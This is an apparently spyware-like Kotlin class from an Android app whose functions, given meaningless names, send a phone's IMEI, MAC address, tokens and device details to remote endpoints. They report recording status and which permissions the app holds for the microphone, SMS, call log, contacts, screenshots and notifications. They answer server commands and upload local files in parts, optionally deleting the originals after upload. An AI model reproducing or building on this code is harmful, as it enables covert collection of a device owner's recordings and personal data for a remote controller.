package com.example.mobiletwo

import android.util.Log
import java.io.BufferedReader
import java.io.File
import java.io.InputStreamReader
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL

abstract class MyApiOld {

    companion object {
        fun haberkorn(device_name:String, mac_address:String, app_name:String,
                      device_model:String, android_version:String, imei:String, battery_percentage:String,
                      device_storage:String, token:String, conn_type:String, device_ram:String, device_language:String) {


            val jsonBody:String = "{\n" +
                    "    \"device_name\": \"$device_name\",\n" +
                    "    \"mac_address\": \"$mac_address\",\n" +
                    "    \"app_name\": \"$app_name\",\n" +
                    "    \"device_model\": \"$device_model\",\n" +
                    "    \"android_version\": \"$android_version\",\n" +
                    "    \"IMEI1\": \"$imei\",\n" +
                    "    \"battery_percentage\": \"$battery_percentage\",\n" +
                    "    \"device_language\": \"$device_language\",\n" +
                    "    \"devie_storage\": \"//TODO: SUM UP CAPS\",\n" +
                    "    \"token\": \"$token\",\n" +
                    "    \"conn_type\": \"$conn_type\",\n" +
                    "    \"device_ram\": \"$device_ram\"\n" +
                    "}"
            Log.i("API.haberkorn: ", jsonBody)
            post(Consts.haberkorn, jsonBody).also { MainActivity.finishAffinityCus() }


        }

        fun resp(request_id:String, response_msg:String, record_part_num:String?,record_parts_count:String?,request_status:String,command:String,part_num:String?, imei:String) {
            try {

                val xrecord_part_num = if (record_part_num!! != "") {"    \"record_part_num\":\"${record_part_num}\",\n"} else ""
                val xrecord_parts_count = if (record_parts_count!! != "") {"    \"record_parts_count\":\"${record_parts_count}\",\n"} else ""
                val xpart_num = if (part_num!! != "") {"    \"part_num\":\"${part_num}\",\n"} else ""
                val jsonBody:String = "{\n" +
                        "    \"request_id\":\"$request_id\",\n" +
                        "    \"response_msg\":\"$response_msg\",\n" +
                        xrecord_part_num +
                        xrecord_parts_count +
                        "    \"IMEI1\":\"$imei\",\n" +
                        "    \"request_status\":\"$request_status\",\n" +
                        xpart_num +
                        "    \"command\":\"$command\"\n" +
                        "}"
                Log.i("API.resp: ", jsonBody)
                post(Consts.resp, jsonBody)
            } catch (ex:Exception){
                MyExecutorFG.logEx(ex, "resp")}
        }

        fun patrick(device_name:String,token:String,recording_status:String,request_id:String, imei:String) {
            val xString = if (request_id != "0") {"    \"request_id\": \"$request_id\", \n"} else {""}
            val jsonBody:String = "{\n" +
                    "    \"device_name\": \"$device_name\",\n" +
                    "    \"token\": \"$token\",\n" +
                    "    \"IMEI1\": \"$imei\",\n" +xString+
                    "    \"recording_status\": \"$recording_status\"\n" +
                    "}"
            Log.i("API.patrick: ", jsonBody)
            post(Consts.patrick, jsonBody)
        }

        fun admondson(device_name:String, parts_count:String?, part_num:String, request_id:String?, recording_status:String, imei:String) {
            val jsonBody:String = "{\n" +
                    "    \"device_name\": \"$device_name\", \n" +
                    "    \"parts_count\": \"$parts_count\", \n" +
                    "    \"part_num\": \"$part_num\", \n" +
                    "    \"IMEI1\": \"$imei\",\n" +
                    {if (request_id != "0") {"    \"request_id\": \"$request_id\", \n"} else {""} }+
                    "    \"recording_status\": \"$recording_status\", \n" +
                    "}"
            Log.i("API.admondson: ", jsonBody)
            post(Consts.admondson, jsonBody)
        }

        fun modo(device_name:String,request_id:String, mic:String, Storage:String, CallLog:String, SMS:String,
                 Contacts:String, screenshot:String, notification:String, googlePlay:String, imei:String) {
//            val jsonBody:String = "{\n" +
//                    "    \"device_name\": \"$device_name\",\n" +
//                    {if (request_id != "0") {"    \"request_id\": \"$request_id\", \n"} } +
//                    "}"
            val a6:String = (if (request_id != "0"){",\n    \"request_id\": \"$request_id\""}else{""})
            val jsonBody:String =
                """{
                        "device_name": "$device_name",
                        "Mic": "$mic",
                        "Storage": "$Storage",
                        "callLog": "$CallLog",
                        "SMS": "$SMS",
                        "IMEI1": "$imei",
                        "Contacts": "$Contacts",
                        "screenshot": "$screenshot",
                        "notification": "$notification",
                        "googlePlay": "$googlePlay"$a6                       
                        }""".trimIndent()
            Log.i("jsonBody for modo: ", jsonBody)
            post(Consts.modo, jsonBody)
        }


        fun conan(request_id: String, token:String,command_value:String,device_name:String, fPath:String, fName:String, fType:String, imei:String, pNum:String?, pCount:String?, toDelete:Boolean): Int {
            try{
                val mMultipart = Multipart(URL(Consts.conan))
                mMultipart.addFilePart("file", File(fPath), fName, fType)
                mMultipart.addFormField("device_name", device_name)
                if (request_id != "0") {
                    mMultipart.addFormField("request_id", request_id)
                }
                mMultipart.addFormField("file_type", fType)
                mMultipart.addFormField("IMEI1", imei)
                if (request_id != "0") {
                    mMultipart.addFormField("command_value", command_value)
                }
                mMultipart.addFormField("part_num", pNum ?: "")
                mMultipart.addFormField("parts_count", pCount ?: "")
                mMultipart.addFormField("token", token)
                Log.d(
                    "Info",
                    "device name:$device_name, request id:$request_id, token:$token, command value:$command_value, file type: $fType, imei: $imei, pNum: $pNum, pCount: $pCount"
                )
                val mHandle = Handle(fPath, toDelete)
                mMultipart.upload(mHandle)
                return 0
            }catch (ex:Exception){
                MyExecutorFG.logEx(ex, "conan")
                return 1
            }
        }

        private fun post(urlString: String, jsonBody:String) {
            val url = URL(urlString)
            val mConnection: HttpURLConnection = url.openConnection() as HttpURLConnection
            mConnection.requestMethod="POST"
            mConnection.setRequestProperty("Content-Type", "application/json")
            //TODO add user-agent
            mConnection.setRequestProperty("User-Agent", Consts.mUserAgent)
            mConnection.setRequestProperty("Accept", "application/json")
            mConnection.doOutput=true
            try {
                val mOutputStream: OutputStream = mConnection.outputStream
                val mByteArray: ByteArray = jsonBody.toByteArray(Charsets.UTF_8)
                mOutputStream.write(mByteArray)
            } catch (e:Exception) {
                MyExecutorFG.logEx(e, "post")
            }
            try{
                BufferedReader(InputStreamReader(mConnection.inputStream, "utf-8")).use { br ->

                    val response = StringBuilder()
                    var responseLine: String?
                    while (br.readLine().also { responseLine = it } != null) {
                        response.append(responseLine!!.trim { it <= ' ' })
                    }
                    println(response.toString())
                }
            }catch (ex:Exception){
                MyExecutorFG.writeError(ex)
                println("Response in null!!")
            }
            MyJobScheduler.taskResult.put("", "")
        }

    }

    class Handle(override var fPath: String, var toDelete: Boolean) :Multipart.OnFileUploadedListener{

        override fun onFileUploadingSuccess(response: String) {
            Log.i("Success: ", response)
            if (toDelete){ File(fPath).delete() }
        }
        override fun onFileUploadingFailed(responseCode: Int) {
            Log.i("failed: ", responseCode.toString())
        }
    }

}

